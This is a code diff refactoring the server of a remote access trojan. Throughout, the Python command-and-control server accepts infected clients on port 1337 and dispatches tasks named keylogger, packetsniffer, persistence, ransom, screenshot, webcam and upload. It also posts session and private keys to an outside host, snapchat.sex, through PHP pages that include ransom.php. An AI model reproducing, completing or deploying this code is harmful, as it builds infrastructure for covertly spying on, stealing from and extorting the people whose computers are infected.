@@ -82,19 +82,6 @@ a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
 PORT = 1337
 
 
-# public website with PHP scripts embedded for remote database interaction
-DATABASE = {
-    'domain': 'https://snapchat.sex/',
-    'pages' : {
-        'query'     : 'query.php',
-        'session'   : 'session.php',
-        'ransom'    : 'ransom.php'
-    },
-    'session_key': None,
-    'tasks': ['keylogger','packetsniffer','persistence','ransom','screenshot','webcam','upload']
-}
-
-
 # server is contained to the local network if debugging mode is true
 DEBUG = False
 
@@ -104,13 +91,13 @@ colorama.init()
 
 
 
-class ServerThread(threading.Thread):
+class Server(threading.Thread):
 
     global threads
-
+    database = {'domain': 'https://snapchat.sex/', 'pages' : {'query'     : 'query.php','session'   : 'session.php','ransom'    : 'ransom.php'},'session_key': None,'tasks': ['keylogger','packetsniffer','persistence','ransom','screenshot','webcam','upload']}
     
     def __init__(self, port, **kwargs):
-        super(ServerThread, self).__init__()
+        super(Server, self).__init__()
         self.exit_status    = 0
         self.clients        = {}
         self.count          = 1
@@ -136,14 +123,12 @@ class ServerThread(threading.Thread):
             'session'       :   self.get_current_session,
             'webcam'        :   self.webcam_client,
             }
-        self.db             = globals().get('DATABASE')
-        self._rand_color    = lambda: getattr(colorama.Fore, random.choice(['RED','CYAN','GREEN','YELLOW','WHITE','MAGENTA']))
-        self._text_color    = self._rand_color()
+        self._text_color    = getattr(colorama.Fore, random.choice(['RED','CYAN','GREEN','YELLOW','MAGENTA']))
         self._text_style    = colorama.Style.DIM
         self._prompt_color  = colorama.Fore.RESET
         self._prompt_style  = colorama.Style.BRIGHT
         self.name           = time.time()
-        self.db['session_key'] = self._diffiehellman()
+        self.database['session_key'] = self._session_key()
         self.s              = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.s.bind(('localhost', port)) if globals().get('DEBUG') else self.s.bind(('0.0.0.0', port))
@@ -290,18 +275,18 @@ class ServerThread(threading.Thread):
         except Exception as e:
             return self._error(str(e))
     
-    def _diffiehellman(self):
+    def _session_key(self):
         try:
             g  = 2
             p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
             a  = bytes_to_long(os.urandom(32))
             xA = pow(g, a, p)
-            xB = requests.post(self.db['domain'] + self.db['pages']['session'], data={'public_key': hex(xA).strip('L'), 'id': '0000000000000000000000000000000000000000000000000000000000000000'}).content
+            xB = requests.post(self.database['domain'] + self.database['pages']['session'], data={'public_key': hex(xA).strip('L'), 'id': '0000000000000000000000000000000000000000000000000000000000000000'}).content
             xB = long(xB)
             x  = pow(xB, a, p)
             return self._obfuscate(SHA256.new(bytes(x).strip('L')).hexdigest())
         except Exception as e:
-            return self._error("{} returned error: {}".format(self._diffiehellman.func_name, str(e)))
+            return self._error("{} returned error: {}".format(self._session_key.func_name, str(e)))
 
     def encrypt(self, data, client_id=None):
         if str(client_id).isdigit() and int(client_id) in self.clients:
@@ -401,14 +386,13 @@ class ServerThread(threading.Thread):
                 self.clients[int(client_id)].shell.clear()
         self.current_client = None
         self.shell.set()
-        return self.run()
     
     def sendall_clients(self, msg):
         for client in self.get_clients():
             try:
                 self.send_client(msg, client.name)
             except Exception as e:
-                self._error('{} failed with error: {}'.format(self.sendall_clients.func_name, str(e)))
+                self._error('{} returned error: {}'.format(self.sendall_clients.func_name, str(e)))
         self._return()
     
     def remove_client(self, client_id):
@@ -468,6 +452,7 @@ class ServerThread(threading.Thread):
             except Exception as e:
                 print(str(e))
         sys.exit()
+        exit()
 
     def display_settings(self, args=None):
         if not args:
@@ -518,7 +503,7 @@ class ServerThread(threading.Thread):
         with lock:
             print('\n')
             print(colorama.Fore.YELLOW  + colorama.Style.DIM + '\t.' + '-' * int(max_k + max_v + 3) + colorama.Fore.YELLOW + colorama.Style.DIM + '.')
-            print(colorama.Fore.YELLOW  + colorama.Style.DIM + '\t|' + self._text_color + colorama.Style.BRIGHT + ' ' * int(min_k + 1) + 'command <argument>' + ' ' * min_k + colorama.Fore.YELLOW + colorama.Style.DIM + '|' + colorama.Style.BRIGHT + self._text_color + ' ' * int(min_v + 1) + 'description' + ' ' * min_v + colorama.Fore.YELLOW + colorama.Style.DIM + '|')
+            print(colorama.Fore.YELLOW  + colorama.Style.DIM + '\t|' + self._text_color + colorama.Style.BRIGHT + ' ' * int(min_k + 1) + 'command <argument>' + ' ' * int(min_k + 1) + colorama.Fore.YELLOW + colorama.Style.DIM + '|' + colorama.Style.BRIGHT + self._text_color + ' ' * int(min_v + 1) + 'description' + ' ' * int(min_v + 1) + colorama.Fore.YELLOW + colorama.Style.DIM + '|')
             print(colorama.Fore.YELLOW  + colorama.Style.DIM + '\t|' + '-' * int(max_k + max_v + 3) + colorama.Fore.YELLOW + colorama.Style.DIM + '|')
             for key in sorted(info):
                 print(colorama.Fore.YELLOW  + colorama.Style.DIM + '\t|' + self._text_color + self._text_style + max_key.format(key) + colorama.Fore.YELLOW + colorama.Style.DIM + '|' + self._text_color + max_val.format(str(info[key])) + colorama.Fore.YELLOW + colorama.Style.DIM + '|')
@@ -654,7 +639,7 @@ class ServerThread(threading.Thread):
         try:
             if task:
                 cmd, _, __  = bytes(task.get('task')).partition(' ')
-                if cmd in self.db['tasks']:
+                if cmd in self.database['tasks']:
                     query   = self.query_database("INSERT INTO tasks (id, client_id, session_id, task, data) VALUES ({})".format(', '.join("'{}'".format(i) for i in (str(task['id']), str(task['client_id']), str(task['session_id']), str(task['task']), str(task['data'])))), display=False)
             else:
                 if self.current_client:
@@ -663,7 +648,7 @@ class ServerThread(threading.Thread):
                     results = json.loads(output.get('data'))
                     for task in results:
                         cmd, _, __  = bytes(task.get('task')).partition(' ')
-                        if cmd in self.db['tasks']:
+                        if cmd in self.database['tasks']:
                             query   = self.query_database("INSERT INTO tasks (id, client_id, session_id, task, data) VALUES ({})".format(', '.join("'{}'".format(i) for i in (str(task['id']), str(task['client_id']), str(task['session_id']), str(task['task']), str(task['data'])))), display=False)
         except Exception as e:
             self._error("{} returned error: {}".format(self.save_task_results.func_name, str(e)))
@@ -671,8 +656,8 @@ class ServerThread(threading.Thread):
 
     def get_current_session(self):
         try:
-            if self.db.get('session_key'):
-                return self._deobfuscate(self.db['session_key'])
+            if self.database.get('session_key'):
+                return self._deobfuscate(self.database['session_key'])
             else:
                 return "No session key found"
         except Exception as e:
@@ -680,10 +665,10 @@ class ServerThread(threading.Thread):
             self._return()
 
     def query_database(self, query, display=True):
-        if self.db.get('session_key'):
-            key     = self.db['session_key']
+        if self.database.get('session_key'):
+            key     = self.database['session_key']
             query   = self._encrypt_aes(query, self._deobfuscate(key))
-            data    = requests.post(self.db['domain'] + self.db['pages']['query'], data={'query': query}).content
+            data    = requests.post(self.database['domain'] + self.database['pages']['query'], data={'query': query}).content
             if data:
                 output  = self._decrypt_aes(data, self._deobfuscate(key))
                 if output:
@@ -712,6 +697,7 @@ class ServerThread(threading.Thread):
             client              = ClientHandler(connection, address=addr, name=self.count, private_key=private, public_key=public)
             self.clients[self.count]  = client
             self.count  += 1
+            sys.stdout.write('\n')
             client.start()
             self.run() if not self.current_client else self.current_client.run()
             
@@ -765,7 +751,7 @@ class ClientHandler(threading.Thread):
         self.address        = kwargs.get('address')
         self.public_key     = kwargs.get('public_key')
         self.private_key    = kwargs.get('private_key')
-        self.session_key    = self._diffiehellman()
+        self.session_key    = self._session_key()
         self.info           = self._info()
         self.session        = self._session()
         self.connection.setblocking(True)
@@ -812,7 +798,7 @@ class ClientHandler(threading.Thread):
     def _session(self):
         try:
             query       = threads['server'].query_database("INSERT INTO sessions ({}) VALUES ({})".format(', '.join(['client_id','session_key','private_key','public_key']), ', '.join(["'{}'".format(v) for v in [self.info['id'], self.session_key, self.private_key.exportKey(), self.public_key.exportKey()]])), display=False)
-            session_id  = requests.post(threads['server'].db['domain'] + threads['server'].db['pages']['session'], data={'id': self.info['id']}).content
+            session_id  = requests.post(Server.database['domain'] + Server.database['pages']['session'], data={'id': self.info['id']}).content
             print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "\n\n\n [+] " + colorama.Fore.RESET + "New connection" + colorama.Style.DIM + "\n\n{:>14}\t\t{}\n{:>15} {:>72}\n".format("Client ID", self.name, "Session ID", session_id) + threads['server']._text_color + threads['server']._text_style)
             ciphertext  = getattr(threads['server'], '_encrypt_{}'.format(self.info.get('encryption')))(session_id, threads['server']._deobfuscate(self.session_key))
             self.connection.sendall(ciphertext + '\n')
@@ -829,7 +815,7 @@ class ClientHandler(threading.Thread):
             self._error("{} returned error: {}".format(self._session.func_name, str(e)))
             self._kill()
 
-    def _diffiehellman(self):
+    def _session_key(self):
         try:
             g  = 2
             p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
@@ -841,7 +827,7 @@ class ClientHandler(threading.Thread):
             y  = SHA256.new(long_to_bytes(x)).hexdigest()
             return threads['server']._obfuscate(y)
         except Exception as e:
-            self._error("{} returned error: {}".format(self._diffiehellman, str(e)))
+            self._error("{} returned error: {}".format(self._session_key, str(e)))
             self._kill()
 
     def run(self):
@@ -887,9 +873,9 @@ class ClientHandler(threading.Thread):
 if __name__ == '__main__':
     port    = int(PORT)
     threads = {}
-    threads['server'] = ServerThread(port)
+    threads['server'] = Server(port)
     os.system('cls' if os.name is 'nt' else 'clear')
-    print(threads['server']._rand_color() + BANNER + colorama.Fore.WHITE)
+    print(getattr(colorama.Fore, random.choice(['RED','CYAN','GREEN','YELLOW','WHITE','MAGENTA'])) + BANNER + colorama.Fore.WHITE)
     print(colorama.Fore.YELLOW + "[?] " + colorama.Fore.RESET + "Use 'help' for command usage information\n\n")
     threads['server'].start()
  
